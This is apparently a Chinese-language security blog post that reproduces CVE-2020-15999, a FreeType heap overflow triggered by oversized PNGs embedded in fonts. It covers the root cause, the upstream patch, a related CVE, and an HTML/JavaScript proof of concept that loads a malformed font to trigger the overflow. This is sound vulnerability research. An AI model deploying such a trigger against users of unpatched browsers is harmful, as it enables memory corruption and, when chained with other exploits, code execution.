---
title: Font-Based Attack Vectors & Exploitation
subtitle:
description: 字體解析工具/引擎中的CVE和漏洞利用方式驗證與復現
publish: true
tags:
  - 資安
  - CVE
featured_image:
created_date: 2025-12-15
---
<div style="position: relative; width: 100%; height: 0; padding-top: 56.2500%;
 padding-bottom: 0; box-shadow: 0 2px 8px 0 rgba(63,69,81,0.16); margin-top: 1.6em; margin-bottom: 0.9em; overflow: hidden;
 border-radius: 8px; will-change: transform;">
  <iframe loading="lazy" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0; border: none; padding: 0;margin: 0;"
    src="https://www.canva.com/design/DAG2-FUWtdI/CoEaPym4h4e2pGMx9khqAg/view?embed" allowfullscreen="allowfullscreen" allow="fullscreen">
  </iframe>
</div>

## 構想與概述
一直都對電腦和瀏覽器如何解析字體檔案十分感興趣，因此這次選了一些字體解析工具/引擎中的CVE和漏洞利用方式並進行驗證與復現 :D

>[!quote]+ Related Keywords
>- OpenType/TrueType font exploit
>- Font based exploit
>(他比較像是一個較為廣泛的指稱所以只有一些相關聯的ATT&CK方法)
   
>[!note]+ Background
>**font based exlpoit 特色:**
>- 涵蓋了 web/os/mobile
>- 系統層面攻擊的惡意字體檔案多牽涉Ring 0或是較高權限級別操作 有機會繞過一些安全防護被提權
>- Zero Click + 自動載入過程難以察覺
>- 經常以字體檔案作為載體，一般不太會特別注意，故容易被APT組織利用
>
>---
>**攻擊面(Attack surface):** 
>- WEB層面 
>	- 惡意web字體
>	- CSS/PNG引入字體解析邏輯漏洞
>- 文件層面
>	- office / 內嵌字體
>	- 釣魚附件
>- 系統層面
>	- 字體驅動
>	- 容易結合其他提權漏洞觸發 kernel evade
>- 應用程式層面
>	- ADOBE 軟體相關漏洞
>	- 電子書字體
>----
>**相關ATT&CK技術分類**
>- T1189 - Drive-by Compromise (路過式攻擊)
>	- zero click
>	- Watering Hole
>
>- T1190 - Exploit Public-Facing Application (利用面向公眾的應用程式)
>	- Web server
>	- 利用字體處理漏洞
>
>- T1566.001 - Phishing: Spearphishing Attachment (魚叉式釣魚附件)
>
>- T1203 - Exploitation for Client Execution (客戶端執行漏洞利用)
>	- 利用字體解析器漏洞RCE
>
>- T1068 - Exploitation for Privilege Escalation (權限提升漏洞利用)
>	- win32k.sys



## CVE-2020-15999
[CVE-2020-15999: FreeType Heap Buffer Overflow in Load_SBit_Png | 0-days In-the-Wild](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-15999.html)
### 基本資料
- 版本: FreeType 2.10.2 / Google Chrome < 86.0.4240.111 / Mozilla Firefox< 82
- 類型: CWE-787 OOB Write (Out-of-bounds Write) -- Heap Buffer Overflow
- 觸發條件: 解析含有惡意 PNG 的字體檔案
- 影響範圍: 所有Web瀏覽器/Android/Chrome OS
- 已被野外利用+APT組織使用

### 漏洞成因

#### 背景知識
在字體檔案`.ttf`/.`otf`中，傳統的方式是利用座標點跟貝茲曲線的向量方式儲存後經過渲染引擎處理並顯示出來，但由於要支援emoji這種多色+多細節的特徵(比如這個--> 🛐)，使用了

| Vector         | Bitmap | Native support |                                    |
| -------------- | ------ | -------------- | ---------------------------------- |
| W3C SVG        | ✔      | ✔              | macOS 10.14+, iOS 12+, Windows 10+ |
| Apple SBIX     |        | ✔              | macOS and iOS                      |
| Google CBDT    |        | ✔              | Android                            |
| Microsoft COLR | ✔      |                | Windows 8.1+                       |
四種方法，其中後兩種是使用`bitmap font` 的方式把png塞到字體檔案裡面，產生了`SBIX(standard bitmap graphics) table`和`CBDT table`的結構(兩者本質上差不多)，讓引擎在渲染的時候可以選擇合適的大小/解析度

```
ttf file
<name>
<cmap> --> 映射到的字元
<glyf> --> 向量字體數值
<SBIX / CBDT> --> PNG圖片
```

用`fonttools`這個python套件可以快速提取`sbix`表成`xml`: `ttx -t sbix .\emoji.woff`
(`cbdx`也是相同方法 下面會以sbix作為範例解說)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ttFont sfntVersion="\x00\x01\x00\x00" ttLibVersion="4.49">

  <sbix>
    <version value="1"/>
    <flags value="00000000 00000001"/>
    <strike>
      <ppem value="150"/>
      <resolution value="72"/>
      <glyph name=".notdef"/>
      <glyph graphicType="png " name=".notdef#1" originOffsetX="0" originOffsetY="0">
        <hexdata>
          89504e47 0d0a1a0a 0000000d 49484452
          00000001 00040001 08060000 01ec58fa
          e5000400 1f494441 54780100 ffff0000
          00000000 00000000 00000000 00000000
          00000000 00000000 00000000 00000000
          00000000 00000000 00000000 00000000
          00000000 00000000 00000000 00000000
          00000000 00000000 00000000 00000000
          00000000 000000f0 6e020c00 60cb0001
          38967a14 00000000 49454e44 ae426082
        </hexdata>
      </glyph>
    </strike>
  </sbix>

</ttFont>
```

這邊hexdata開頭的`89504e47`就是`png`的magic number (!!!)，後面接的是壓縮的圖片資訊
![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251123073333.png)
(對比[官方文檔](https://learn.microsoft.com/en-us/typography/opentype/spec/sbix)與ttx提取的內容結果)

也因為這樣讓字體檔案變得比較大，可能會想為何不用svg，但svg的速度太慢，大小計算也較麻煩
![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251118070958.png)

(對比)論文常用的Times New Roman也才4KB
![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251123051804.png)

用PS直觀感受一下
![image.png](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251123070245.png)


#### 漏洞位置
而在chromiumu引擎中有引用一個叫做`freetype`的lib作為字體解析引擎，其中`pngshim.c`中的`Load_SBit_Png()`中便是處理此類含有png處理的主要邏輯

![image.png|500](https://raw.githubusercontent.com/Ash0645/image_remote/main/20251118064105.png)
[他們甚至有自己的code search page 超酷->pngshim.c - Chromium Code Search](https://source.chromium.org/chromium/chromium/src/+/main:third_party/freetype/src/src/sfnt/pngshim.c;drc=84197c7c159c87a1891581b3c8fab87a394557ea;l=251)


```c++
FT_LOCAL_DEF( FT_Error )  
  Load_SBit_Png( FT_GlyphSlot     slot,  
                 FT_Int           x_offset,  
                 FT_Int           y_offset,  
                 FT_Int           pix_bits,  
                 TT_SBit_Metrics  metrics,  
                 FT_Memory        memory,  
                 FT_Byte\*         data,  
                 FT_UInt          png_len,  
                 FT_Bool          populate_map_and_metrics,  
                 FT_Bool          metrics_only )  
  {  
  
[...]  
  
    png_get_IHDR( png, info,  
                  &imgWidth, &imgHeight,  
                  &bitdepth, &color_type, &interlace,  
                  NULL, NULL ); // \*\*\* 1 \*\*\*  
  
[...]  
  
    if ( populate_map_and_metrics )  
    {  
      metrics->width  = (FT_UShort)imgWidth; // \*\*\* 2 \*\*\*  
      metrics->height = (FT_UShort)imgHeight;  
  
      map->width      = metrics->width;  
      map->rows       = metrics->height;  
      map->pixel_mode = FT_PIXEL_MODE_BGRA;  
      map->pitch      = (int)( map->width \* 4 );  
  
[...]  
  
    if ( populate_map_and_metrics )  
    {  
      /\* this doesn't overflow: 0x7FFF \* 0x7FFF \* 4 < 2^32 \*/  
      FT_ULong  size = map->rows \* (FT_ULong)map->pitch; // \*\*\* 3 \*\*\*  
  
  
      error = ft_glyphslot_alloc_bitmap( slot, size ); // \*\*\* 4 \*\*\*  
      if ( error )  
        goto DestroyExit;  
    }  
  
[...]  
  
    png_read_image( png, rows ); // \*\*\* 5 \*\*\*  
```

這邊的主要問題是
- `metrics->width  = (FT_UShort)imgWidth;`： 圖像寬度和高度原先都是 `uint32`，這邊會將它截斷成`uint16`
- 如果字體中嵌入的 $\text{PNG}$ 圖片，其寬度或高度超過65535(2bytes, uint16的大小)，截斷後會變成極小或錯誤的值
- 因為被誤判為錯誤的值，記憶體就會分配遠小於他的heap buffer，在寫入圖片時會寫超過 --> **Out Of Bound Write**
#### 利用方式
雖然看起來是一個沒有好好檢查範圍的型別轉換錯誤漏洞，但是這個cve比較有趣的是大量的野外利用，像是下面的幾個常見方式跟攻擊鏈:

##### CSS sideloading --> ACE

payload:
```css
@font-face {
    font-family: 'ExploitFont';
    src: url('<惡意構築的字體檔案>.ttf') format('truetype');
}

body {
    font-family: 'ExploitFont', sans-serif;
}
```
受害者用chromium based的任一瀏覽器開到了惡意網頁 --> 網頁讀取css --> 自動下載字體與調用FreeType --> heap buffer overflow (ACE)

##### ACE --> LPE --> RCE

上面成功達成可以寫入shellcode之後，跟其他權限提升的CVE結合再一起就可以達成提權，進一步造成RCE
這邊也不限OS，因此攻擊面十分廣泛

#### POC

```html
<html>
	<body>
	<script>
		font_face = new FontFace('foo', new Uint8Array([0,1,0,0,0,11,0,144,0,3,0,32,79,83,47,50,0,0,0,0,0,0,0,188,0,0,0,96,99,109,97,112,0,0,0,0,0,0,1,28,0,0,0,44,103,108,121,102,0,0,0,0,0,0,1,72,0,0,0,2,104,101,97,100,0,0,0,0,0,0,1,76,0,0,0,54,104,104,101,97,0,0,0,0,0,0,1,132,0,0,0,36,104,109,116,120,0,0,0,0,0,0,1,168,0,0,0,12,108,111,99,97,0,0,0,0,0,0,1,180,0,0,0,8,109,97,120,112,0,0,0,0,0,0,1,188,0,0,0,32,110,97,109,101,0,0,0,0,0,0,1,220,0,0,0,6,112,111,115,116,0,0,0,0,0,0,1,228,0,0,0,40,115,98,105,120,0,0,0,0,0,0,2,12,0,8,0,228,0,4,3,31,1,144,0,5,0,0,2,188,2,138,0,0,0,140,2,188,2,138,0,0,1,221,0,50,0,250,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,32,32,32,32,0,64,0,65,0,67,2,238,255,6,0,0,3,32,0,18,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,32,0,8,0,0,0,1,0,3,0,1,0,0,0,12,0,4,0,32,0,0,0,4,0,4,0,1,0,0,0,67,255,255,0,0,0,65,255,255,255,191,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,95,15,60,245,0,43,3,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,32,3,32,0,0,0,8,0,2,0,0,0,0,0,0,0,1,0,0,3,32,255,6,0,0,3,32,255,255,0,1,3,31,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,3,32,0,90,3,32,0,90,3,32,0,90,0,0,0,0,0,0,0,0,0,1,0,0,0,3,0,8,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,2,0,0,0,0,0,0,255,181,0,50,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,12,0,150,0,72,0,0,0,20,0,0,0,20,0,4,0,118,0,8,0,216,0,0,0,0,112,110,103,32,137,80,78,71,13,10,26,10,0,0,0,13,73,72,68,82,0,0,0,1,0,4,0,1,8,6,0,0,1,236,88,250,229,0,4,0,31,73,68,65,84,120,1,0,255,255].concat(Array(524442).fill(0),[1,4,0,251,255,0,0,0,0,0,60,0,1,238,161,155,68,0,0,0,0,73,69,78,68,174,66,96,130,234,207])));
font_face.load().then(() => {
	  document.fonts.add(font_face);
	    document.body.style.fontFamily = 'foo';
	    document.body.textContent = 'B';
});
	</script>
	</body></html>
```

#### 修補方法
修補方法也相當簡易，進行範圍檢查進行防範
```diff
diff --git a/src/sfnt/pngshim.c b/src/sfnt/pngshim.c  
index 2e64e5846..f55016122 100644  
--- a/src/sfnt/pngshim.c  
+++ b/src/sfnt/pngshim.c  
@@ -332,6 +332,13 @@  
  
     if ( populate_map_and_metrics )  
     {  
+      /* reject too large bitmaps similarly to the rasterizer */  
+      if ( imgHeight > 0x7FFF || imgWidth > 0x7FFF )  
+      {  
+        error = FT_THROW( Array_Too_Large );  
+        goto DestroyExit;  
+      }  
+  
       metrics->width  = (FT_UShort)imgWidth;  
       metrics->height = (FT_UShort)imgHeight;  
  
@@ -340,13 +347,6 @@  
       map->pixel_mode = FT_PIXEL_MODE_BGRA;  
       map->pitch      = (int)( map->width * 4 );  
       map->num_grays  = 256;  
-  
-      /* reject too large bitmaps similarly to the rasterizer */  
-      if ( map->rows > 0x7FFF || map->width > 0x7FFF )  
-      {  
-        error = FT_THROW( Array_Too_Large );  
-        goto DestroyExit;  
-      }  
     }  
  
     /* convert palette/gray image to rgb */
```

但同時PNG的IDAT是一個壓縮的資料區，因此壓縮前後都檢查較為保險 
### 延伸 - CVE-2025-27363
[CVE-2025-27363/analysis.md at main · tin-z/CVE-2025-27363](https://github.com/tin-z/CVE-2025-27363/blob/main/analysis.md)
版本: chromium 的 FreeType套件  2.13.0 及以下
類型: CWE-787 OOB Write (Out-of-bounds Write)
利用：TrueType GX 子字形解析
影響：Web瀏覽器 Linux、Android、Chrome OS 已確認野外利用

在解析 **TrueType GX / Variable Font 子字形結構**的過程中把 signed short 轉成 unsigned long，再加上靜態偏移導致overflow，分配了過小的堆緩衝區，造成Out of Bounds Write，並且可以像2020-15999一樣串聯其他的提權漏洞進一步造成RCE




>[!quote]+ 延伸閱讀
>https://www.colorfonts.wtf/
>https://issues.chromium.org/issues/40053661
>https://savannah.nongnu.org/bugs/index.php?59308
>https://css-tricks.com/colrv1-and-css-font-palette-web-typography/

